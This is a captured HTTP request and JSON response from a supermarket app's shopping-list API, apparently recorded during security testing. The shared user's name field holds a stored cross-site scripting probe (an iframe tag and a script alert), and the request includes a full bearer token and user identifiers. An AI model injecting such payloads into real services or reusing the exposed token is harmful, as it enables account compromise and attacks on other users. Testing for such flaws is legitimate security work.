Request:
```json
GET /api/v2/user/shoppinglists/activeList HTTP/1.1
Host: app-proxy.pingodoce.pt
Pdapp-Storeid: -1
Pdapp-Cardnumber: 
Pdapp-Lcid: 64147ea7c77762af853639c2
Pdapp-Hid: 5826423315
Pdapp-Clubs: 
X-App-Version: v-3.1.5 buildType-release flavor-prod
X-Device-Version: Android-29
X-Screen-Density: 3.5
Authorization: Bearer eyJhbGciOiJSUzUxMiIsInR5cCI6ImF0K2p3dCJ9.eyJuYmYiOjE2Nzk2Njc2NTQsImV4cCI6MTY3OTY3MTI1NCwiaXNzIjoiaHR0cHM6Ly9hcHAtcHJveHkucGluZ29kb2NlLnB0LyIsImF1ZCI6InBkYXBwIiwiY2xpZW50X2lkIjoiUERBcHBDbGllbnQiLCJzdWIiOiIzZGZkNDcyOC01NmQ2LTQ3MjAtNGRmMS0wOGRiMjZiNWUyMmMiLCJhdXRoX3RpbWUiOjE2Nzk2Njc2NTQsImlkcCI6ImxvY2FsIiwic2NvcGUiOlsib3BlbmlkIiwicGRhcHAuYW5vbnltb3VzX2FjY2VzcyIsInBkYXBwLmNoYW5nZV9udW1iZXIiLCJwZGFwcC5mdWxsX2FjY2VzcyIsInBkYXBwLm9uYm9hcmRpbmdfYWNjZXNzIiwicGRhcHAuc21zX2FjY2VzcyIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyJwd2QiXX0.hp04FaypK-uuQsWlO2dSideNWxGR1Dh50N-h6L89XrDguvoQmwOdJ-Fu7Ry7X2WMRSAZSkt9LCOEOrUDw5OOxxAgrbGlwcP4VZ4RZtQhUVaklKNpJ8NIu2TBp8XUn1EMwPLmicxL3Z4NxBEEvU5bRCZkf-hWxkk5iUHnUBGoEc8WbC0KPP-27jdfXrCcBzXhjIQAQQ4WVZCPLFp5xb9hemS0HuQqtPcYjTKqqZmJcIkdK1n24O-IwNZUihR3HQ23gSHxWZ6fq08PeWCcBxbQR6cQvUif2Od9iY0xwmS3qasJQkWo4BhWQJmTA1bU5zUS7tr_Bkz5o95KSNJ3asOnzQ
Accept-Language: en-US
Accept-Encoding: gzip, deflate
User-Agent: okhttp/4.10.0
Connection: close

```

Response:
```json
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json; charset=utf-8
Date: Fri, 24 Mar 2023 14:20:55 GMT
Vary: Accept-Encoding
Request-Context: appId=cid-v1:b18b1f5c-1067-4634-a8b5-28282182ef3d
Strict-Transport-Security: max-age=2592000; preload
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'none'; sandbox allow-forms allow-same-origin allow-scripts; base-uri 'self';
X-Content-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'none'; sandbox allow-forms allow-same-origin allow-scripts; base-uri 'self';
Referrer-Policy: no-referrer
api-supported-versions: 1,2
X-Powered-By: ASP.NET
Content-Length: 593

{"id":"8091f6a7-b07e-4f86-8c7b-55290a6c31ab","clientId":"ab94dd2d-4239-48f8-8f27-93c439afcbdf","userId":"d7f029b2-75fb-4122-fe4b-08db2b6d2419","name":"Nova Lista","isActive":true,"products":[],"sharedWith":[{"id":"3dfd4728-56d6-4720-4df1-08db26b5e22c","canWrite":true,"isActive":true,"isOwner":true,"number":"93*****80","name":"%3Ciframe%20Scr=Http://Pengrey.Com%20%3C <Script>Alert(1);</Script>","storeId":814,"dateCreated":"2023-03-23T18:46:41.0725754Z","dateUpdated":"2023-03-23T18:46:41.0725756Z"}],"dateCreated":"2023-03-23T17:35:48.4012648Z","dateUpdated":"2023-03-23T18:46:41.0631848Z"}
```